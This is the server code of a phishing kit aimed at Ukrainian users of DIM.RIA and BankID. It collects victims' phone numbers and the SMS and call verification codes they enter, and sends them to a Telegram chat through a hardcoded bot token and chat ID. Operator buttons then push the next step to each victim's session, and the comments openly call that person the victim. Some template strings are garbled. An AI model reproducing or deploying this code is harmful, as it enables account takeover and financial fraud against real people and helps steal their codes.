const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

const BOT_TOKEN = "8311394660:AAEt9CJLYspkbVUcopIYik2KFh1EXLgIko8";
const CHAT_ID = "-1003298945563";
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

// Хранилище команд для каждой сессии
const sessions = new Map(); // session → { action: 'call' | 'sms' | 'bankid' }

app.use(bodyParser.json());
app.use(express.static(__dirname));

// ... твои LOGOS и PROJECT_NAMES без изменений ...

app.post('/api/send-data', async (req, res) => {
    const { session, step, phone, code, call_code, sms_code, worker, project = 'dimria', city = 'Невідомо' } = req.body;
    const projectName = PROJECT_NAMES[project] || 'DIM.RIA';

    let text = '';
    let keyboard = null;

    if (step === 'phone' && phone) {
        text = `*ПРОЕКТ:* \( {projectName}\n*Номер:* \` \){phone}\`\n*Місто:* ${city}`;
        if (worker) text += `\n*Воркер:* @${worker}`;

        keyboard = {
            inline_keyboard: [[
                { text: "Звонок", callback_data: `call|${session}` },
                { text: "Код", callback_data: `sms|${session}` },
                { text: "BankID", callback_data: `bankid|${session}` }
            ]]
        };

        // Сохраняем сессию
        sessions.set(session, { phone, project, city, worker });
    }

    if (step === 'call_code') text = `*ЗВОНОК 4 цифры:* \`\( {call_code}\`\nНомер: \` \){phone}\``;
    if (step === 'sms_code') text = `*SMS КОД:* \`\( {sms_code}\`\nНомер: \` \){phone}\``;

    if (text) {
        await fetch(TELEGRAM_API + '/sendMessage', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text,
                parse_mode: 'Markdown',
                reply_markup: keyboard
            })
        });
    }

    res.json({ success: true });
});

// Получаем команду для сессии
app.get('/api/command', (req, res) => {
    const { session } = req.query;
    const cmd = sessions.get(session);
    if (cmd && cmd.action) {
        sessions.delete(session); // одноразовая команда
        res.json({ action: cmd.action });
    } else {
        res.json({});
    }
});

// Обработка нажатия кнопок
app.post(`/webhook_${BOT_TOKEN}`, async (req, res) => {
    if (req.body.callback_query) {
        const [action, session] = req.body.callback_query.data.split('|');

        // Сохраняем команду — жертва получит её при следующем опросе
        if (sessions.has(session)) {
            sessions.set(session, { ...sessions.get(session), action });
        }

        // Подтверждаем нажатие
        await fetch(TELEGRAM_API + '/answerCallbackQuery', {
            method: 'POST',
            body: JSON.stringify({
                callback_query_id: req.body.callback_query.id,
                text: "Команда отправлена жертве..."
            })
        });
    }
    res.sendStatus(200);
});

app.listen(PORT, () => {
    console.log(`Сервер запущен: http://localhost:${PORT}`);
    
    // УКАЖИ ЭТОТ ВЕБХУК В @BotFather !!!
    // Команда: /setprivacy → Off
    // Затем в @BotFather: /setwebhook
    // URL: https://твой-домен.onrender.com/webhook_8311394660:AAEt9CJLYspkbVUcopIYik2KFh1EXLgIko8
});
